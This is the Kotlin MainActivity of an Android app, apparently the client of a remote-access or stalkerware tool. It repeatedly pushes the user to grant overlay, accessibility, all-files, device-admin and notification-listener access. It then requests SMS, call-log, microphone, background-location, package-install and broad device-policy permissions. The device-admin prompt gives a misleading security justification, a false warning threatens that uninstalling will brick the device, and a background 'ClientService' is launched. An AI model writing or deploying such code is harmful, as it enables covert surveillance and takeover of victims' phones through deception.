package com.client

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Activity.ACCESSIBILITY_SERVICE
import android.app.Activity.ACTIVITY_SERVICE
import android.app.ActivityManager
import android.app.NotificationManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.net.Uri
import android.net.VpnService
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityManager
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontStyle
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.app.ActivityCompat
import com.client.receivers.ReceiverDeviceAdmin
import com.client.services.client.ClientService
import com.client.services.other.MyAccessibilityService
import com.client.services.other.MyNotificationListenerService
import com.client.ui.theme.ClientTheme

fun isMyServiceRunning(context: Context, serviceClass: Class<*>): Boolean {
    val manager = context.getSystemService(ACTIVITY_SERVICE) as ActivityManager
    for (service in manager.getRunningServices(Int.MAX_VALUE)) {
        if (serviceClass.name == service.service.className) {
            return true
        }
    }
    return false
}

fun isAccessibilityServiceEnabled(
    context: Context,
    service: Class<out AccessibilityService?>
): Boolean {
    val am: AccessibilityManager =
        context.getSystemService(ACCESSIBILITY_SERVICE) as AccessibilityManager
    val enabledServices: List<AccessibilityServiceInfo> =
        am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)

    for (enabledService in enabledServices) {
        val enabledServiceInfo: ServiceInfo = enabledService.resolveInfo.serviceInfo
        if (enabledServiceInfo.packageName.equals(context.packageName) && enabledServiceInfo.name.equals(
                service.name
            )
        ) return true
    }

    return false
}

class MainActivity : ComponentActivity() {
    private val OVERLAY_PERMISSION_REQUEST_CODE: Int = 1
    private val EXTERNAL_MANAGER_REQUEST_CODE: Int = 2
    private val ACCESSIBILITY_REQUEST_CODE: Int = 3
    private val DEVICE_ADMIN_REQUEST_CODE: Int = 4
    private val NOTIFICATION_REQUEST_CODE: Int = 5
    private val NOTIFICATION_LISTENER_REQUEST_CODE: Int = 6
    private val WRITE_SETTINGS_PERMISSION_REQUEST_CODE: Int = 7
    private val VPN_REQUEST_CODE: Int = 8

    val permissions = mutableListOf(
        Manifest.permission.INSTALL_PACKAGES,
        Manifest.permission.FOREGROUND_SERVICE,
        Manifest.permission.RECEIVE_BOOT_COMPLETED,
        Manifest.permission.RECEIVE_SMS, Manifest.permission.SEND_SMS, Manifest.permission.READ_SMS,
        Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.INTERNET,
        Manifest.permission.MODIFY_AUDIO_SETTINGS,
        Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.ACCESS_WIFI_STATE, Manifest.permission.CHANGE_WIFI_STATE,
        Manifest.permission.BLUETOOTH, Manifest.permission.BLUETOOTH_ADMIN,
        Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.BIND_DEVICE_ADMIN,
        Manifest.permission.CHANGE_NETWORK_STATE,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_CALL_LOG, Manifest.permission.WRITE_CALL_LOG,
        Manifest.permission.MODIFY_PHONE_STATE,
        Manifest.permission.ACCESS_NOTIFICATION_POLICY,
        Manifest.permission.ANSWER_PHONE_CALLS
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            permissions.addAll(
                listOf(
                    Manifest.permission.MANAGE_DEVICE_POLICY_ACCESSIBILITY,
                    Manifest.permission.MANAGE_DEVICE_POLICY_ACCOUNT_MANAGEMENT,
                    Manifest.permission.MANAGE_DEVICE_POLICY_ACROSS_USERS,
                    Manifest.permission.MANAGE_DEVICE_POLICY_ACROSS_USERS_FULL,
                    Manifest.permission.MANAGE_DEVICE_POLICY_ACROSS_USERS_SECURITY_CRITICAL,
                    Manifest.permission.MANAGE_DEVICE_POLICY_AIRPLANE_MODE,
                    Manifest.permission.MANAGE_DEVICE_POLICY_APPS_CONTROL,
                    Manifest.permission.MANAGE_DEVICE_POLICY_APP_RESTRICTIONS,
                    Manifest.permission.MANAGE_DEVICE_POLICY_APP_USER_DATA,
                    Manifest.permission.MANAGE_DEVICE_POLICY_AUDIO_OUTPUT,
                    Manifest.permission.MANAGE_DEVICE_POLICY_AUTOFILL,
                    Manifest.permission.MANAGE_DEVICE_POLICY_BACKUP_SERVICE,
                    Manifest.permission.MANAGE_DEVICE_POLICY_BLUETOOTH,
                    Manifest.permission.MANAGE_DEVICE_POLICY_BUGREPORT,
                    Manifest.permission.MANAGE_DEVICE_POLICY_CALLS,
                    Manifest.permission.MANAGE_DEVICE_POLICY_CAMERA,
                    Manifest.permission.MANAGE_DEVICE_POLICY_CERTIFICATES,
                    Manifest.permission.MANAGE_DEVICE_POLICY_COMMON_CRITERIA_MODE,
                    Manifest.permission.MANAGE_DEVICE_POLICY_DEBUGGING_FEATURES,
                    Manifest.permission.MANAGE_DEVICE_POLICY_DEFAULT_SMS,
                    Manifest.permission.MANAGE_DEVICE_POLICY_DEVICE_IDENTIFIERS,
                    Manifest.permission.MANAGE_DEVICE_POLICY_DISPLAY,
                    Manifest.permission.MANAGE_DEVICE_POLICY_FACTORY_RESET,
                    Manifest.permission.MANAGE_DEVICE_POLICY_FUN,
                    Manifest.permission.MANAGE_DEVICE_POLICY_INPUT_METHODS,
                    Manifest.permission.MANAGE_DEVICE_POLICY_KEYGUARD,
                    Manifest.permission.MANAGE_DEVICE_POLICY_LOCATION,
                    Manifest.permission.MANAGE_DEVICE_POLICY_NETWORK_LOGGING,
                    Manifest.permission.MANAGE_DEVICE_POLICY_PRINTING,
                    Manifest.permission.MANAGE_DEVICE_POLICY_SCREEN_CAPTURE,
                    Manifest.permission.MANAGE_DEVICE_POLICY_SMS,
                    Manifest.permission.MANAGE_DEVICE_POLICY_MTE,
                    Manifest.permission.MANAGE_DEVICE_POLICY_SYSTEM_UPDATES,
                    Manifest.permission.MANAGE_DEVICE_POLICY_QUERY_SYSTEM_UPDATES,
                    Manifest.permission.MANAGE_DEVICE_POLICY_TIME,
                    Manifest.permission.MANAGE_DEVICE_POLICY_VPN,
                    Manifest.permission.MANAGE_DEVICE_POLICY_WIFI,
                )
            )
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            permissions.addAll(
                listOf(
                    Manifest.permission.BLUETOOTH_CONNECT,
                    Manifest.permission.BLUETOOTH_ADVERTISE,
                    Manifest.permission.BLUETOOTH_SCAN
                )
            )
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissions.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            permissions.add(Manifest.permission.FOREGROUND_SERVICE_SPECIAL_USE)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            permissions.addAll(
                listOf(
                    Manifest.permission.MANAGE_EXTERNAL_STORAGE,
                    Manifest.permission.QUERY_ALL_PACKAGES
                )
            )
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.NEARBY_WIFI_DEVICES)
        }
        val devicePolicyManager =
            getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent: ComponentName =
            ComponentName(this, ReceiverDeviceAdmin::class.java)
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (!Settings.canDrawOverlays(this)) {
            Toast.makeText(this, "Please enable appear on top for full features", Toast.LENGTH_LONG).show()
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + packageName))
            startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST_CODE)
        } else if (!isAccessibilityServiceEnabled(this, MyAccessibilityService::class.java)) {
            // Redirect user to the Accessibility Settings page
            Toast.makeText(this, "Please enable accessibility service for full features", Toast.LENGTH_LONG).show()
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivityForResult(intent, ACCESSIBILITY_REQUEST_CODE)
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            Toast.makeText(this, "Please enable all files access for full features", Toast.LENGTH_LONG).show()
            val uri = Uri.parse("package:${BuildConfig.APPLICATION_ID}")
            startActivityForResult(
                Intent(
                    Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    uri
                ), EXTERNAL_MANAGER_REQUEST_CODE
            )
        } else if (!devicePolicyManager.isAdminActive(adminComponent)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(
                    DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "This app requires device administrator permissions to provide enhanced security features."
                )
            }
            startActivityForResult(intent, DEVICE_ADMIN_REQUEST_CODE)
        } else if (!notificationManager.isNotificationPolicyAccessGranted) {
            val intent = Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS)
            startActivityForResult(intent, NOTIFICATION_REQUEST_CODE)
        } else if (!isMyServiceRunning(this, MyNotificationListenerService::class.java)) {
            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
            startActivityForResult(intent, NOTIFICATION_LISTENER_REQUEST_CODE)
        } else if (!Settings.System.canWrite(this)) {
            requestWriteSettingsPermission()
        } else {
            ActivityCompat.requestPermissions(this, permissions.toTypedArray(), 0)
        }
        Log.d("MainActivity", "Is NEARBY_WIFI_DEVICES granted: ${ActivityCompat.checkSelfPermission(this, Manifest.permission.NEARBY_WIFI_DEVICES)}")
        setContent {
            ClientTheme {
                // A surface container using the 'background' color from the theme
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    Column(modifier = Modifier.padding(start = 16.dp, top = 16.dp)) {
                        Text(
                            text = getString(R.string.app_name),
                            modifier = Modifier,
                            fontStyle = FontStyle.Normal,
                            fontWeight = FontWeight.Bold,
                            fontSize = 45.sp
                        )
                        Text(
                            text = "SDK Version: ${Build.VERSION.SDK_INT}",
                            modifier = Modifier.padding(top = 16.dp)
                        )
                        Text(
                            text = "Code Name: ${Build.VERSION.CODENAME}",
                            modifier = Modifier
                        )
                        Text(
                            text = "Security Patch Level: ${Build.VERSION.SECURITY_PATCH}",
                            modifier = Modifier
                        )
                        Text(
                            text = "Release: ${Build.VERSION.RELEASE}",
                            modifier = Modifier
                        )
                        Text(
                            text = "Build Number: ${Build.VERSION.INCREMENTAL}",
                            modifier = Modifier
                        )
                        Text(
                            text = "Base OS: ${Build.VERSION.BASE_OS}",
                            modifier = Modifier
                        )
                        Text(
                            text = "Build ID: ${Build.DISPLAY}",
                            modifier = Modifier
                        )
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                            Text(
                                text = "Release or Codename: ${Build.VERSION.RELEASE_OR_CODENAME}",
                                modifier = Modifier
                            )
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                            Text(
                                text = "Release or Version Preview: ${Build.VERSION.RELEASE_OR_PREVIEW_DISPLAY}",
                                modifier = Modifier
                            )
                        }
                        Text(
                            text = "WARNING: Do not uninstall this app or your device will get bricked permanently",
                            modifier = Modifier.padding(top = 32.dp),
                            color = Color.Red
                        )
                    }
                }
            }
        }
        if (!isMyServiceRunning(this, ClientService::class.java)) {
            Log.d("MainActivity", "Starting foreground service")
            val intent = Intent(applicationContext, ClientService::class.java)
            intent.action = ClientService.Actions.START.toString()
            startService(intent)
        }
    }

    @Deprecated("This method has been deprecated in favor of using the Activity Result API\n      which brings increased type safety via an {@link ActivityResultContract} and the prebuilt\n      contracts for common intents available in\n      {@link androidx.activity.result.contract.ActivityResultContracts}, provides hooks for\n      testing, and allow receiving results in separate, testable classes independent from your\n      activity. Use\n      {@link #registerForActivityResult(ActivityResultContract, ActivityResultCallback)}\n      with the appropriate {@link ActivityResultContract} and handling the result in the\n      {@link ActivityResultCallback#onActivityResult(Object) callback}.")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        val devicePolicyManager =
            getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent: ComponentName =
            ComponentName(this, ReceiverDeviceAdmin::class.java)
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val vpnIntent = VpnService.prepare(this)
        if (requestCode == OVERLAY_PERMISSION_REQUEST_CODE) {
            if (!Settings.canDrawOverlays(this)) {
                Toast.makeText(this, "Please enable appear on top for full features", Toast.LENGTH_LONG).show()
                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + packageName))
                startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST_CODE)
            } else if (!isAccessibilityServiceEnabled(this, MyAccessibilityService::class.java)) {
                // Redirect user to the Accessibility Settings page
                Toast.makeText(this, "Please enable accessibility service for full features", Toast.LENGTH_LONG).show()
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                startActivityForResult(intent, ACCESSIBILITY_REQUEST_CODE)
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
                Toast.makeText(this, "Please enable all files access for full features", Toast.LENGTH_LONG).show()
                val uri = Uri.parse("package:${BuildConfig.APPLICATION_ID}")
                startActivityForResult(
                    Intent(
                        Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                        uri
                    ), EXTERNAL_MANAGER_REQUEST_CODE
                )
            } else if (!devicePolicyManager.isAdminActive(adminComponent)) {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                    putExtra(
                        DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "This app requires device administrator permissions to provide enhanced security features."
                    )
                }
                startActivityForResult(intent, DEVICE_ADMIN_REQUEST_CODE)
            } else if (!notificationManager.isNotificationPolicyAccessGranted) {
                val intent = Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS)
                startActivityForResult(intent, NOTIFICATION_REQUEST_CODE)
            } else if (!isMyServiceRunning(this, MyNotificationListenerService::class.java)) {
                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                startActivityForResult(intent, NOTIFICATION_LISTENER_REQUEST_CODE)
            } else if (!Settings.System.canWrite(this)) {
                requestWriteSettingsPermission()
            } else {
                ActivityCompat.requestPermissions(this, permissions.toTypedArray(), 0)
            }
        } else if (requestCode == ACCESSIBILITY_REQUEST_CODE) {
            if (!isAccessibilityServiceEnabled(this, MyAccessibilityService::class.java)) {
                // Redirect user to the Accessibility Settings page
                Toast.makeText(this, "Please enable accessibility service for full features", Toast.LENGTH_LONG).show()
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                startActivityForResult(intent, ACCESSIBILITY_REQUEST_CODE)
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
                Toast.makeText(this, "Please enable all files access for full features", Toast.LENGTH_LONG).show()
                val uri = Uri.parse("package:${BuildConfig.APPLICATION_ID}")
                startActivityForResult(
                    Intent(
                        Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                        uri
                    ), EXTERNAL_MANAGER_REQUEST_CODE
                )
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
                Toast.makeText(this, "Please enable all files access for full features", Toast.LENGTH_LONG).show()
                val uri = Uri.parse("package:${BuildConfig.APPLICATION_ID}")
                startActivityForResult(
                    Intent(
                        Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                        uri
                    ), EXTERNAL_MANAGER_REQUEST_CODE
                )
            } else if (!devicePolicyManager.isAdminActive(adminComponent)) {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                    putExtra(
                        DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "This app requires device administrator permissions to provide enhanced security features."
                    )
                }
                startActivityForResult(intent, DEVICE_ADMIN_REQUEST_CODE)
            } else if (!notificationManager.isNotificationPolicyAccessGranted) {
                val intent = Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS)
                startActivityForResult(intent, NOTIFICATION_REQUEST_CODE)
            } else if (!isMyServiceRunning(this, MyNotificationListenerService::class.java)) {
                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                startActivityForResult(intent, NOTIFICATION_LISTENER_REQUEST_CODE)
            } else if (!Settings.System.canWrite(this)) {
                requestWriteSettingsPermission()
            } else {
                ActivityCompat.requestPermissions(this, permissions.toTypedArray(), 0)
            }
        } else if (requestCode == EXTERNAL_MANAGER_REQUEST_CODE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
                Toast.makeText(this, "Please enable all files access for full features", Toast.LENGTH_LONG).show()
                val uri = Uri.parse("package:${BuildConfig.APPLICATION_ID}")
                startActivityForResult(
                    Intent(
                        Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                        uri
                    ), EXTERNAL_MANAGER_REQUEST_CODE
                )
            } else if (!devicePolicyManager.isAdminActive(adminComponent)) {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                    putExtra(
                        DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "This app requires device administrator permissions to provide enhanced security features."
                    )
                }
                startActivityForResult(intent, DEVICE_ADMIN_REQUEST_CODE)
            } else if (!notificationManager.isNotificationPolicyAccessGranted) {
                val intent = Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS)
                startActivityForResult(intent, NOTIFICATION_REQUEST_CODE)
            } else if (!isMyServiceRunning(this, MyNotificationListenerService::class.java)) {
                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                startActivityForResult(intent, NOTIFICATION_LISTENER_REQUEST_CODE)
            } else if (!Settings.System.canWrite(this)) {
                requestWriteSettingsPermission()
            } else {
                ActivityCompat.requestPermissions(this, permissions.toTypedArray(), 0)
            }
        } else if (requestCode == DEVICE_ADMIN_REQUEST_CODE) {
            if (!devicePolicyManager.isAdminActive(adminComponent)) {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                    putExtra(
                        DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "This app requires device administrator permissions to provide enhanced security features."
                    )
                }
                startActivityForResult(intent, DEVICE_ADMIN_REQUEST_CODE)
            } else if (!notificationManager.isNotificationPolicyAccessGranted) {
                val intent = Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS)
                startActivityForResult(intent, NOTIFICATION_REQUEST_CODE)
            } else if (!isMyServiceRunning(this, MyNotificationListenerService::class.java)) {
                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                startActivityForResult(intent, NOTIFICATION_LISTENER_REQUEST_CODE)
            } else if (!Settings.System.canWrite(this)) {
                requestWriteSettingsPermission()
            } else {
                ActivityCompat.requestPermissions(this, permissions.toTypedArray(), 0)
            }
        } else if (requestCode == NOTIFICATION_REQUEST_CODE) {
            if (!notificationManager.isNotificationPolicyAccessGranted) {
                val intent = Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS)
                startActivityForResult(intent, NOTIFICATION_REQUEST_CODE)
            } else if (!isMyServiceRunning(this, MyNotificationListenerService::class.java)) {
                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                startActivityForResult(intent, NOTIFICATION_LISTENER_REQUEST_CODE)
            } else if (!Settings.System.canWrite(this)) {
                requestWriteSettingsPermission()
            } else {
                ActivityCompat.requestPermissions(this, permissions.toTypedArray(), 0)
            }
        } else if (requestCode == NOTIFICATION_LISTENER_REQUEST_CODE) {
            if (!isMyServiceRunning(this, MyNotificationListenerService::class.java)) {
                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                startActivityForResult(intent, NOTIFICATION_LISTENER_REQUEST_CODE)
            } else if (!Settings.System.canWrite(this)) {
                requestWriteSettingsPermission()
            } else {
                ActivityCompat.requestPermissions(this, permissions.toTypedArray(), 0)
            }
        } else if (requestCode == WRITE_SETTINGS_PERMISSION_REQUEST_CODE) {
            if (!Settings.System.canWrite(this)) {
                requestWriteSettingsPermission()
            } else {
                ActivityCompat.requestPermissions(this, permissions.toTypedArray(), 0)
            }
        }
    }

    fun requestWriteSettingsPermission() {
        val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
            data = Uri.parse("package:$packageName")
        }
        startActivityForResult(intent, WRITE_SETTINGS_PERMISSION_REQUEST_CODE)
    }
}
